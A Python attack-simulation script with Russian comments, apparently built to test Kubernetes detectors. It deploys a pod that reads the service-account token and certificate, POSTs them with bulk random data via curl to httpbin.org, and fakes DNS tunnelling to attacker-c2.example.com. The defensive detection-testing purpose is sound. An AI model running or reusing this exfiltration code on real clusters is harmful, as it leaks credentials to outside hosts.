"""
s10_exfiltration.py — T1041 Exfiltration Over C2 Channel
=========================================================

Симулирует exfiltration: pod читает секреты и конфиги кластера,
затем передаёт их наружу большими объёмами через HTTP.

Ключевой момент: атака умышленно "тихая" в audit-канале
(минимум API-вызовов), зато громкая в network-канале.
Это демонстрирует ценность multi-modal подхода:
одноканальный audit-детектор пропустит, network-детектор поймает.

Ожидаемые сигналы:
  Network:  feat_external_egress >> базлайн (большой исходящий объём)
            feat_unique_external_dst рост (несколько C2 endpoints)
            feat_cluster_net_bytes_out spike в metrics
  Audit:    feat_secrets_access_count небольшой (читаем секреты)
  Metrics:  feat_cluster_net_bytes_out всплеск
  Logs:     feat_unseen_templates (curl/wget в логах)
"""

import subprocess
import time

POD_NAME = "attack-exfil"

# Имитируем C2 серверы через публичные echo-сервисы
# (реальный трафик уходит наружу, но без реальных данных)
C2_ENDPOINTS = [
    "https://httpbin.org/post",
    "https://webhook.site/token-placeholder",  # пользователь может заменить на реальный
    "https://requestbin.com/",
]

POD_MANIFEST = f"""
apiVersion: v1
kind: Pod
metadata:
  name: {POD_NAME}
  labels:
    app: {POD_NAME}
    attack-scenario: s10-exfiltration
spec:
  restartPolicy: Never
  serviceAccountName: default
  containers:
  - name: exfil
    image: curlimages/curl:latest
    command:
    - /bin/sh
    - -c
    - |
      echo "[attack] Exfiltration simulation started"

      echo "[attack] Phase 1: Collecting data to exfiltrate..."
      # Читаем доступные данные (то что доступно default SA)
      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 200)
      NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
      CERT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -c 200)

      echo "[attack] Phase 2: Exfiltrating via HTTP POST (simulated C2)..."
      # Генерируем большой payload имитирующий дамп данных
      PAYLOAD=$(dd if=/dev/urandom bs=1024 count=100 2>/dev/null | base64 | head -c 50000)

      # Отправляем несколько раз на разные C2 endpoints
      for i in $(seq 1 5); do
        curl -s -o /dev/null -w "POST %{{http_code}} size=%{{size_upload}}b\\n" \
             -X POST \
             -H "Content-Type: application/json" \
             -d "{{\\"token\\":\\"$TOKEN\\",\\"ns\\":\\"$NAMESPACE\\",\\"data\\":\\"$PAYLOAD\\"}}" \
             --connect-timeout 5 --max-time 15 \
             "https://httpbin.org/post" 2>/dev/null || echo "  C2 unreachable (expected in air-gap)"
        sleep 3
      done

      echo "[attack] Phase 3: DNS exfiltration simulation (high fan-out)..."
      # Генерируем много уникальных DNS-запросов имитируя DNS tunneling
      for i in $(seq 1 50); do
        SUBDOMAIN=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 16)
        # nslookup/ping генерирует DNS запросы
        nslookup "${{SUBDOMAIN}}.attacker-c2.example.com" 2>/dev/null || true
        sleep 0.2
      done

      echo "[attack] Phase 4: Large volume transfer simulation..."
      # Имитируем непрерывную передачу данных
      for i in $(seq 1 10); do
        BIG_PAYLOAD=$(dd if=/dev/urandom bs=1024 count=500 2>/dev/null | base64)
        curl -s -o /dev/null \
             -X POST -d "$BIG_PAYLOAD" \
             --connect-timeout 3 --max-time 10 \
             "https://httpbin.org/post" 2>/dev/null || true
        sleep 2
      done

      echo "[attack] Exfiltration complete."
    resources:
      requests:
        cpu: "100m"
        memory: "128Mi"
"""

ATTACK_DURATION = 200


def run(namespace: str = "default", dry_run: bool = False):
    print(f"[S10] Deploying exfiltration pod '{POD_NAME}' in '{namespace}'")
    print(f"      Key signals: feat_external_egress, feat_dns_unique_domains, feat_cluster_net_bytes_out")
    print(f"      Duration: {ATTACK_DURATION}s")

    if dry_run:
        print("[DRY] Would create pod doing large outbound HTTP transfers + DNS fan-out")
        return

    _apply(POD_MANIFEST, namespace)

    print("[S10] Waiting for pod to start...")
    _wait_for_phase(POD_NAME, namespace, "Running", timeout=60)

    print(f"[S10] Exfiltration running...")
    print(f"      Watch: kubectl logs -f {POD_NAME} -n {namespace}")
    _wait_for_phase(POD_NAME, namespace, "Succeeded", timeout=ATTACK_DURATION)

    print("[S10] Cleaning up...")
    cleanup(namespace)


def cleanup(namespace: str = "default"):
    subprocess.run(
        ["kubectl", "delete", "pod", POD_NAME, "-n", namespace,
         "--ignore-not-found", "--grace-period=0", "--force"],
        capture_output=True
    )
    print("[S10] Cleanup done.")


def _apply(manifest: str, namespace: str):
    result = subprocess.run(
        ["kubectl", "apply", "-n", namespace, "-f", "-"],
        input=manifest.encode(), capture_output=True
    )
    if result.returncode != 0:
        raise RuntimeError(f"kubectl apply failed: {result.stderr.decode()}")
    print(f"      {result.stdout.decode().strip()}")


def _wait_for_phase(name: str, namespace: str, phase: str, timeout: int = 60):
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = subprocess.run(
            ["kubectl", "get", "pod", name, "-n", namespace,
             "-o", "jsonpath={.status.phase}"],
            capture_output=True, text=True
        )
        current = result.stdout.strip()
        if current == phase:
            print(f"      Phase: {phase} ✓")
            return
        if current == "Failed":
            print("      ⚠️  Pod failed")
            return
        print(f"      Phase: {current or 'Pending'}...")
        time.sleep(8)
    print(f"      ⚠️  Timeout waiting for {phase}")
